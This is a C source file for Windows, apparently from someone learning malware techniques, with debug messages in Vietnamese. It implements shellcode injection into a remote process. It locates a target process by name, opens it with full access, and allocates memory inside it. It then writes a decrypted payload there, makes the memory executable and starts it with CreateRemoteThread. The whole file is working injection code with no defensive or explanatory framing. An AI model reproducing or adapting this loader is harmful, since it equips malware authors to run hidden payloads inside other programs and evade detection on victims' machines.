#include "injection.h"
#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <string.h>
#include <winternl.h>

// Print the input buffer as a hex char array
VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

  printf("unsigned char %s[] = {", Name);

    for (int i = 0; i < Size; i++) {
    	if (i % 16 == 0)
      	    printf("\n\t");

    	if (i < Size - 1) 
        {
            printf("0x%0.2X, ", Data[i]);
        }
        else
        {
            printf("0x%0.2X ", Data[i]);

        }
   
    }
        

  printf("};\n\n\n");

}

BOOL getRemoteProcHandle(char* procName, DWORD* procPID, HANDLE* procHand){

    PROCESSENTRY32 proc = {

        .dwSize = sizeof(PROCESSENTRY32)


    };

    HANDLE hSnapShot = NULL;

    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnapShot == INVALID_HANDLE_VALUE){

        printf("Lay handle cau hsnapshot that bai \n");
        return FALSE;

    }

    if(!Process32First(hSnapShot, &proc)){

        printf("Ham Process32first that bai \n ");
        CloseHandle(hSnapShot);
        return FALSE;

    }

    do{

        if(_stricmp(proc.szExeFile, procName)==0){

            *procPID = proc.th32ProcessID;

            *procHand = OpenProcess(PROCESS_ALL_ACCESS, FALSE, proc.th32ProcessID);
            if(*procHand == NULL){

                printf("Chua lay dc handle cua remote process \n");
                return FALSE;

            }
            printf("PID cua remote process la : %d \n", proc.th32ProcessID);

            break;



        }


    }while(Process32Next(hSnapShot, &proc));




    if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*procPID == 0 || *procHand == NULL)
		return FALSE;
	return TRUE;



}

BOOL processInjection(PVOID decrypted, size_t payloadSize, HANDLE remoteProcHand){

    DWORD oldProtec = 0;
    PVOID pshellcodeadd = NULL;
    size_t numberbytewrite = 0;
    size_t paySize = payloadSize;

    


    pshellcodeadd = VirtualAllocEx(remoteProcHand, NULL, paySize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pshellcodeadd == NULL){

        printf("khong cap dc dia chi o remote process \n");
        return FALSE;


    } 
    printf("Dia chi da cap phat cho payload trong process la : 0x%p \n", pshellcodeadd);

    if(!WriteProcessMemory(remoteProcHand, pshellcodeadd, decrypted, paySize, &numberbytewrite) || numberbytewrite != paySize){

        printf("Co van de ve viec ghi payload vao remote process \n");
        return FALSE;

    }

    memset(decrypted, '\0', paySize);

    if(!VirtualProtectEx(remoteProcHand, pshellcodeadd, paySize, PAGE_EXECUTE_READWRITE, &oldProtec)){

        printf("Co van de ve viec doi quyen trong remote process \n");
        return FALSE;

    }
    printf("Nhan enter de di tiep \n");
    getchar();

    HANDLE remoteThreadHand = NULL;
    remoteThreadHand = CreateRemoteThread(remoteProcHand, NULL, 0, pshellcodeadd, NULL, 0, NULL);

    if(remoteThreadHand == NULL){

        printf("Co van de ve viec tao thread \n");
        return FALSE;


    }

    //WaitForSingleObject(remoteThreadHand, INFINITE);

    return TRUE;



}

